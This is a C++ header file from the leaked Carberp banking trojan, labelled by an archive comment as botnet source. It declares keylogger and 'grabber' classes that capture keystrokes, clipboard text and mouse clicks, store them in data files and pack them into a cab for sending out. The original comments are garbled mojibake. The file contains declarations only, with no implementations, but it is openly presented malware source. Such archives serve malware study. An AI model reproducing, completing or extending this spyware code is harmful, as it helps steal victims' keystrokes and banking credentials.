/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#ifndef __KeyLoggerH
#define __KeyLoggerH
//---------------------------------------------------------------------------

#include <Windows.h>

#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"



class TKeyLogger;
class TGrabber;





//********************************************************
//   TKeyLogger - ������� ����� ��������
//********************************************************
class TKeyLogger : public TEventContainer
{
private:

	typedef TEventContainer inherited;

	TGrabber* FGrabber;
public:
	TKeyLogger();
	virtual ~TKeyLogger();

	// ������� ���������� ������ ���� � ��������� ��������� ������
	bool Active();

	// ������� ���������� ��� �� ����������
	bool LogKeyboard(HWND Wnd, const char* Text);

	// ������� �������� ������� �� ������ ������
	void LogClipboard(const char* Text);

	// ������� �������� ������� ����
	bool LogMouse(HWND Wnd, int X, int Y, int Button);


    bool ConnectGrabber(TGrabber* Grabber);
	bool DisconnectGrabber(TGrabber* Grabber);

	void CallEvent(int EventId, LPVOID Param); // ���������� �����
};




//********************************************************
//  TInfiniteKeyLogger - ����� ������������ �����������
//                       ����� � ����������. ����� �����-
//  ����� ��������� �� ��� ��������. ������ ������� �
//  ����� ��������� ����.
//
//********************************************************
class TInfiniteKeyLogger : public TBotObject
{
private:
	string FSignalFile;
	string FDataFile;

	string static GetSignalFileName();
public:
	TInfiniteKeyLogger();
	~TInfiniteKeyLogger();

	//--------------------------------------------
	//  Activate - ������� ���������� ����������
	//             ��������
	//--------------------------------------------
	bool static Activate();

	//--------------------------------------------
	//  Activated - ������� ���������� ������ ����
	//             �������� �����������
	//--------------------------------------------
	bool static Activated();
};



//********************************************************
//  TGrabber - ������� ����� �������
//********************************************************
class TGrabber : public TBotObject
{
private:
	string      FName;
	TKeyLogger* FKeyLogger;
	LPVOID      FCab;
	string      FCabFileName;

	friend class TKeyLogger;
protected:
	void virtual LogKeyboad(HWND Wnd, const char* Text) {  }
	void virtual LogClipboard(HWND Wnd, const char* Text);

	LPVOID OpenCab();
	void   CloseCab(bool SendLog);

	void virtual DoEvent(int EventId, LPVOID Param) { }
public:
	TGrabber(const string& GrabberName);
	~TGrabber();
	bool ConnectToKeyLogger();
	bool DisconnectFromKeyLogger();

	string inline Name() { return FName; }
};



//---------------------------------------------------------------------------
#endif
